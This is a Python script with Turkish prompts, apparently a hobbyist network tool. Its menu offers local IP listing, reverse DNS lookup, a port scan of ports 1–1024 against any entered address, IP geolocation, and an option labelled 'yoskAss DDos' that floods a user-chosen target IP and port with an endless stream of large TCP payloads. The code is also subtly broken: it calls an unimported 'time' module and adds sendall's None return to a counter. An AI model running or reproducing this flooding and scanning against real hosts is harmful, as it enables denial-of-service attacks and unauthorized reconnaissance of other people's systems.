import subprocess
import re
import os
import socket
import requests
import time as t

def get_connected_ips():
    connected_ips = []

    # Windows için IP Config komutunu çalıştırma
    if os.name == "nt":
        output = subprocess.check_output("ipconfig")
        output = output.decode("utf-8")

        # IP adreslerini regex ile bulma
        ip_pattern = r"\b(?:\d{1,3}\.){3}\d{1,3}\b"
        ips = re.findall(ip_pattern, output)

        # IP adreslerini kontrol etme
        for ip in ips:
            if ip != "127.0.0.1":
                connected_ips.append(ip)

    # Linux için ifconfig komutunu çalıştırma
    elif os.name == "posix":
        output = subprocess.check_output(["ifconfig"])
        output = output.decode("utf-8")

        # IP adreslerini regex ile bulma
        ip_pattern = r"\b(?:\d{1,3}\.){3}\d{1,3}\b"
        ips = re.findall(ip_pattern, output)

        # IP adreslerini kontrol etme
        for ip in ips:
            if ip != "127.0.0.1":
                connected_ips.append(ip)

    return connected_ips

def get_device_name(ip_address):
    try:
        host_name = socket.gethostbyaddr(ip_address)
        return host_name[0]
    except socket.herror:
        return "Belirtilen IP adresi geçersiz veya cihaz adı bulunamadı."

def port_scan(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        if result == 0:
            return f"Port {port} is open"
        else:
            return f"Port {port} is closed"
        sock.close()
    except Exception as e:
        return f"Error: {e}"

def get_ip_info(ip):
    url = f"http://ip-api.com/json/{ip}"
    response = requests.get(url)
    veri = response.json()
    return veri

def run_stress_test():
    print('''
                                                                                                                             
                                   #                         ######   ######                  
 #   #   ####    ####   #    #    # #     ####    ####       #     #  #     #   ####    ####  
  # #   #    #  #       #   #    #   #   #       #           #     #  #     #  #    #  #      
   #    #    #   ####   ####    #     #   ####    ####       #     #  #     #  #    #   ####  
   #    #    #       #  #  #    #######       #       #      #     #  #     #  #    #       # 
   #    #    #  #    #  #   #   #     #  #    #  #    #      #     #  #     #  #    #  #    # 
   #     ####    ####   #    #  #     #   ####    ####       ######   ######    ####    ####   
                                                                            
                                                                             
    ''')

    # Kullanıcıdan IP adresini alın
    ip = input("Hedef IP adresini girin: ")

    # Kullanıcıdan port numarasını, mesaj boyutunu (byte cinsinden) ve gönderim aralığını (saniye cinsinden) alın
    port = int(input("Port numarasını girin: "))
    msg_size = int(input("Mesaj boyutunu (KB cinsinden) girin: ")) * 1024
    interval = float(input("Gönderim aralığını (saniye cinsinden) girin: "))

    total_sent = 0   # Toplam gönderilen veri miktarını takip etmek için değişken tanımlayın

    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.connect((ip, port))

                data = b'A' * msg_size     # Create a large string containing 'A's
                start_time = time.time()   # Start timer
                while ((time.time() - start_time) < interval):
                    sent = s.sendall(data)      # Send packets continuously until the specified interval has elapsed
                    total_sent += sent          # Gönderilen veri miktarını toplam gönderilen veriyle güncelle
            except Exception as e:
                print("Hata:", str(e))

        # Gönderilen veri miktarını ekrana yazdır
        print("Toplam gönderilen veri miktarı:", total_sent)

def main():
    while True:
        secim = input('''
                                                                                                           
 #   #   ####    ####   #    #    # #     ####    ####       #####   ####    ####   #        ####  
  # #   #    #  #       #   #    #   #   #       #             #    #    #  #    #  #       #      
   #    #    #   ####   ####    #     #   ####    ####         #    #    #  #    #  #        ####  
   #    #    #       #  #  #    #######       #       #        #    #    #  #    #  #            # 
   #    #    #  #    #  #   #   #     #  #    #  #    #        #    #    #  #    #  #       #    # 
   #     ####    ####   #    #  #     #   ####    ####         #     ####    ####   ######   ####  
                                                                                                   

        
        
        
        Yapmak istediğiniz işlemi seçin:\n1. Wifi'nize bağlı IP Adreslerini Göster\n2. IP Adresinin Cihaz Adını Öğren\n3. Port Taraması Yap\n4. IP Adresinin Bilgilerini Al\n5. yoskAss DDos\n6. Çıkış\nSeçiminiz: '''
        
        )

        if secim == "1":
            connected_ips = get_connected_ips()
            print("Bağlı IP Adresleri:")
            for ip in connected_ips:
                print(ip)

        elif secim == "2":
            ip_address = input("Cihaz adını öğrenmek istediğiniz IP adresi: ")
            device_name = get_device_name(ip_address)
            print("IP adresi {} için cihaz adı: {}".format(ip_address, device_name))

        elif secim == "3":
            ip_address = input("Port taraması yapmak istediğiniz IP adresi: ")
            for port_number in range(1, 1025):
                result = port_scan(ip_address, port_number)
                print(result)

        elif secim == "4":
            ip_adresi = input("IP adresini girin: ")
            bilgiler = get_ip_info(ip_adresi)

            if bilgiler['status'] == 'fail':
                print("IP adresi bilgileri bulunamadı.")
            else:
                print("IP Adresi: ", bilgiler['query'])
                print("Şehir: ", bilgiler['city'])
                print("Ülke: ", bilgiler['country'])
                print("Posta Kodu: ", bilgiler['zip'])
                print("Koordinatlar: ", bilgiler['lat'], bilgiler['lon'])
                print("İnternet Sağlayıcı: ", bilgiler['isp'])

        elif secim == "5":
            run_stress_test()

        elif secim == "6":
            print("Program sonlandırılıyor...")
            break

        else:
            print("Geçersiz bir seçim yaptınız. Lütfen tekrar deneyin.")

        t.sleep(2)

if __name__ == "__main__":
    main()
